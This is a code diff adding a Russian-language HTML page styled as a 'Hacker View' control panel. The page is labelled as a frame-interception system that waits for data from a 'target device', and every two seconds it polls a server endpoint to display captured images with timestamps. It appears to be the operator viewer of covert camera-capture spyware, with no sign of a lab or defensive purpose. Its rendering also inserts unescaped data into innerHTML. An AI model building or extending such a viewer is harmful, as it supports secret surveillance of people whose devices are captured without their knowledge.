@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Панель управления (Hacker View)</title>
+    <style>
+        body { background: #1a1a1a; color: #0f0; font-family: monospace; padding: 20px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
+        .frame { border: 1px solid #0f0; padding: 5px; background: #000; text-align: center; }
+        img { width: 100%; border: 1px solid #333; }
+        .timestamp { font-size: 0.8rem; margin-top: 5px; color: #888; }
+        h1 { border-bottom: 2px solid #0f0; padding-bottom: 10px; }
+    </style>
+</head>
+<body>
+    <h1>[ СИСТЕМА ПЕРЕХВАТА КАДРОВ ]</h1>
+    <p>Ожидание данных с целевого устройства...</p>
+    <div class="grid" id="gallery"></div>
+
+    <script>
+        const gallery = document.getElementById('gallery');
+        
+        // Функция для проверки новых кадров
+        async function checkUpdates() {
+            try {
+                const res = await fetch('/latest-frames');
+                const frames = await res.json();
+                
+                gallery.innerHTML = ''; // Очищаем и перерисовываем
+                frames.reverse().forEach(frame => {
+                    const div = document.createElement('div');
+                    div.className = 'frame';
+                    div.innerHTML = `
+                        <img src="${frame.image}">
+                        <div class="timestamp">${frame.time}</div>
+                    `;
+                    gallery.appendChild(div);
+                });
+            } catch (e) {}
+        }
+
+        setInterval(checkUpdates, 2000); // Обновляем каждые 2 секунды
+    </script>
+</body>
+</html>
